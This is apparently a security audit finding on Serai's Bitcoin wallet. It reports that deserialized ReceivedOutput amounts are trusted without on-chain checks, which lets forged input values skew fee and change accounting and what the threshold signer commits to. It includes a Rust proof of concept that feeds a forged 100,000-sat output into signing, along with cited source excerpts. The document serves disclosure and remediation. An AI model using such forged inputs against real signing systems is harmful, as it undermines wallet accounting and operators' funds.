### Title
Forged `ReceivedOutput` amounts are trusted when accounting for and signing Bitcoin spends - (File: `networks/bitcoin/src/wallet/send.rs`)

### Summary
`ReceivedOutput::read` deserializes an attacker-controlled `TxOut` and `OutPoint` without authenticating that the pair exists on-chain or that the amount matches the referenced UTXO. [1](#0-0)  `SignableTransaction::new` then uses the serialized `TxOut.value` as the spendable input balance and retains the same unauthenticated `TxOut` as the Taproot prevout. [2](#0-1) [3](#0-2)  Consequently, forged deposit metadata can overstate the funds available and cause a threshold signer to sign a sighash committing to an amount different from the amount actually present on-chain. [4](#0-3) 

### Finding Description
`ReceivedOutput` consists only of an offset, a serialized `TxOut`, and an `OutPoint`; deserialization accepts all three fields independently. [5](#0-4) [6](#0-5)  There is no check that `outpoint` resolves to a UTXO, nor that the resolved UTXO has the same value or script as the supplied `TxOut`. [6](#0-5) 

`SignableTransaction::new` computes `input_sat` by summing these claimed `TxOut` values, rather than values authenticated against the referenced outpoints. [2](#0-1)  That claimed sum decides whether funding is sufficient and how much value is assigned to change. [7](#0-6) 

Before signing, `multisig` only verifies that the tweaked key derived from `offset` matches the claimed prevout's `script_pubkey`; it does not verify the claimed amount or outpoint against chain state. [8](#0-7)  Signing then supplies the entire claimed `prevouts` vector to `taproot_key_spend_signature_hash` through `Prevouts::All`. [4](#0-3) 

This mirrors the improper-accounting class: the amount recorded by Serai can differ from the amount actually available at the referenced output. [9](#0-8) [2](#0-1) 

### Impact Explanation
An attacker who can supply serialized `ReceivedOutput` data can report a larger UTXO value than exists, causing fee sufficiency, payment allocation, and change calculation to be performed against counterfeit balance. [7](#0-6)  The signer will still produce shares because the only local consistency check compares the derived output script to the supplied script. [10](#0-9) 

The completed transaction contains witness signatures produced over the forged prevout amounts. [11](#0-10) [12](#0-11)  If the referenced on-chain output has a different amount, Bitcoin consensus calculates a different sighash, so the resulting transaction is invalid and any internal accounting that treated the forged amount as available is inconsistent with spendable funds. [4](#0-3) 

### Likelihood Explanation
The reachable input is a serialized `ReceivedOutput`, which is explicitly an untrusted byte surface and is parsed without querying or validating the outpoint. [1](#0-0)  Exploitation only requires choosing an offset that derives the claimed P2TR script and selecting an outpoint whose real amount differs from the claimed `TxOut.value`. [10](#0-9) 

The forged object must reach transaction construction and signing; data obtained directly from `Scanner::scan_transaction` is safe because it clones the actual transaction output and computes the matching outpoint. [13](#0-12)  The issue is therefore conditional on accepting serialized or externally supplied `ReceivedOutput`s rather than exclusively using freshly scanned outputs. [1](#0-0) [14](#0-13) 

### Recommendation
Do not allow `ReceivedOutput::read` to authenticate a spend by itself. Treat deserialized `TxOut` data as untrusted metadata and resolve every `OutPoint` against a trusted chain view before constructing `SignableTransaction`, rejecting any mismatch in amount or `script_pubkey`. Alternatively, make `ReceivedOutput` privately constructible and expose construction only through `Scanner`, which records the actual transaction output and outpoint together. [13](#0-12) 

### Proof of Concept
```rust
use std::{collections::HashMap, io::Cursor};

use bitcoin::{
  consensus::encode::serialize, OutPoint, ScriptBuf, TxOut, Amount, Txid,
};
use frost::{
  curve::Secp256k1,
  dkg::Interpolation,
  sign::{PreprocessMachine, SignMachine, SignatureMachine},
  Participant, ThresholdKeys, ThresholdParams,
};
use k256::{ProjectivePoint, Scalar};
use rand_core::OsRng;
use zeroize::Zeroizing;

use bitcoin_serai::wallet::{
  tweak_keys, p2tr_script_buf, ReceivedOutput, SignableTransaction,
};

let participant = Participant::new(1).unwrap();
let params = ThresholdParams::new(1, 1, participant).unwrap();

let secret = Scalar::random(&mut OsRng);
let verification_share = ProjectivePoint::GENERATOR * secret;
let keys = ThresholdKeys::<Secp256k1>::new(
  params,
  Interpolation::Lagrange,
  Zeroizing::new(secret),
  HashMap::from([(participant, verification_share)]),
).unwrap();
let keys = tweak_keys(keys);

let wallet_script = p2tr_script_buf(keys.group_key()).unwrap();

// A real UTXO controlled by `wallet_script`, but with only 10_000 sats.
let actual_outpoint = OutPoint::new(real_utxo_txid, 0);

// Forge metadata claiming the same script contains 100_000 sats.
let forged_txout = TxOut {
  value: Amount::from_sat(100_000),
  script_pubkey: wallet_script.clone(),
};

let mut encoded = Vec::new();
encoded.extend_from_slice(&Scalar::ZERO.to_bytes());
encoded.extend_from_slice(&serialize(&forged_txout));
encoded.extend_from_slice(&serialize(&actual_outpoint));

let forged_output =
  ReceivedOutput::read(&mut Cursor::new(encoded)).unwrap();

let payment_script = ScriptBuf::new();
let signable = SignableTransaction::new(
  vec![forged_output],
  &[(payment_script, 50_000)],
  Some(wallet_script),
  None,
  1,
).unwrap();

let machine = signable.multisig(&keys).unwrap();
let (sign_machine, _) = machine.preprocess(&mut OsRng);
let (completion_machine, _share) =
  sign_machine.sign(HashMap::new(), b"").unwrap();
let signed_tx = completion_machine.complete(HashMap::new()).unwrap();
```

The claimed `TxOut` causes `SignableTransaction` to account for 100,000 sats even though `actual_outpoint` only references 10,000 sats. [15](#0-14)  `multisig` accepts the forged input because `offset = 0` derives `wallet_script`, and signing commits to the forged prevout amount with `Prevouts::All`. [10](#0-9) [4](#0-3)

### Citations

**File:** networks/bitcoin/src/wallet/mod.rs (L89-97)
```rust
#[derive(Clone, PartialEq, Eq, Debug)]
pub struct ReceivedOutput {
  // The scalar offset to obtain the key usable to spend this output.
  offset: Scalar,
  // The output to spend.
  output: TxOut,
  // The TX ID and vout of the output to spend.
  outpoint: OutPoint,
}
```

**File:** networks/bitcoin/src/wallet/mod.rs (L115-118)
```rust
  /// The value of this output.
  pub fn value(&self) -> u64 {
    self.output.value.to_sat()
  }
```

**File:** networks/bitcoin/src/wallet/mod.rs (L120-133)
```rust
  /// Read a ReceivedOutput from a generic satisfying Read.
  #[cfg(feature = "std")]
  pub fn read<R: Read>(r: &mut R) -> io::Result<ReceivedOutput> {
    let offset = Secp256k1::read_F(r)?;
    let output;
    let outpoint;
    {
      let mut buf_r = BufReader::with_capacity(0, r);
      output =
        TxOut::consensus_decode(&mut buf_r).map_err(|_| io::Error::other("invalid TxOut"))?;
      outpoint =
        OutPoint::consensus_decode(&mut buf_r).map_err(|_| io::Error::other("invalid OutPoint"))?;
    }
    Ok(ReceivedOutput { offset, output, outpoint })
```

**File:** networks/bitcoin/src/wallet/mod.rs (L198-213)
```rust
  /// Scan a transaction.
  pub fn scan_transaction(&self, tx: &Transaction) -> Vec<ReceivedOutput> {
    let mut res = Vec::new();
    for (vout, output) in tx.output.iter().enumerate() {
      // If the vout index exceeds 2**32, stop scanning outputs
      let Ok(vout) = u32::try_from(vout) else { break };

      if let Some(offset) = self.scripts.get(&output.script_pubkey) {
        res.push(ReceivedOutput {
          offset: *offset,
          output: output.clone(),
          outpoint: OutPoint::new(tx.compute_txid(), vout),
        });
      }
    }
    res
```

**File:** networks/bitcoin/src/wallet/send.rs (L175-190)
```rust
    let input_sat = inputs.iter().map(|input| input.output.value.to_sat()).sum::<u64>();
    let offsets = inputs.iter().map(|input| input.offset).collect();
    let tx_ins = inputs
      .iter()
      .map(|input| TxIn {
        previous_output: input.outpoint,
        script_sig: ScriptBuf::new(),
        sequence: Sequence::MAX,
        witness: Witness::new(),
      })
      .collect::<Vec<_>>();

    let payment_sat = payments.iter().map(|payment| payment.1).sum::<u64>();
    let mut tx_outs = payments
      .iter()
      .map(|payment| TxOut { value: Amount::from_sat(payment.1), script_pubkey: payment.0.clone() })
```

**File:** networks/bitcoin/src/wallet/send.rs (L215-230)
```rust
    if input_sat < (payment_sat + needed_fee) {
      Err(TransactionError::NotEnoughFunds {
        inputs: input_sat,
        payments: payment_sat,
        fee: needed_fee,
      })?;
    }

    // If there's a change address, check if there's change to give it
    if let Some(change) = change {
      let (weight_with_change, vbytes_with_change) =
        Self::calculate_weight_vbytes(tx_ins.len(), payments, Some(&change));
      let fee_with_change = fee_per_vbyte * vbytes_with_change;
      if let Some(value) = input_sat.checked_sub(payment_sat + fee_with_change) {
        if value >= DUST {
          tx_outs.push(TxOut { value: Amount::from_sat(value), script_pubkey: change });
```

**File:** networks/bitcoin/src/wallet/send.rs (L252-254)
```rust
      offsets,
      prevouts: inputs.drain(..).map(|input| input.output).collect(),
      needed_fee,
```

**File:** networks/bitcoin/src/wallet/send.rs (L273-281)
```rust
  pub fn multisig(self, keys: &ThresholdKeys<Secp256k1>) -> Option<TransactionMachine> {
    let mut sigs = vec![];
    for i in 0 .. self.tx.input.len() {
      let offset = keys.clone().offset(self.offsets[i]);
      if p2tr_script_buf(offset.group_key())? != self.prevouts[i].script_pubkey {
        None?;
      }

      sigs.push(AlgorithmMachine::new(Schnorr::new(), keys.clone().offset(self.offsets[i])));
```

**File:** networks/bitcoin/src/wallet/send.rs (L373-397)
```rust
    let mut cache = SighashCache::new(&self.tx.tx);
    // Sign committing to all inputs
    let prevouts = Prevouts::All(&self.tx.prevouts);

    let mut shares = Vec::with_capacity(self.sigs.len());
    let sigs = self
      .sigs
      .drain(..)
      .enumerate()
      .map(|(i, sig)| {
        let (sig, share) = sig.sign(
          commitments[i].clone(),
          cache
            .taproot_key_spend_signature_hash(i, &prevouts, TapSighashType::Default)
            // This should never happen since the inputs align with the TX the cache was
            // constructed with, and because i is always < prevouts.len()
            .expect("taproot_key_spend_signature_hash failed to return a hash")
            .as_ref(),
        )?;
        shares.push(share);
        Ok(sig)
      })
      .collect::<Result<_, _>>()?;

    Ok((TransactionSignatureMachine { tx: self.tx.tx, sigs }, shares))
```

**File:** networks/bitcoin/src/wallet/send.rs (L417-427)
```rust
    for (input, schnorr) in self.tx.input.iter_mut().zip(self.sigs.drain(..)) {
      let sig = schnorr.complete(
        shares.iter_mut().map(|(l, shares)| (*l, shares.remove(0))).collect::<HashMap<_, _>>(),
      )?;

      let mut witness = Witness::new();
      witness.push(sig);
      input.witness = witness;
    }

    Ok(self.tx)
```
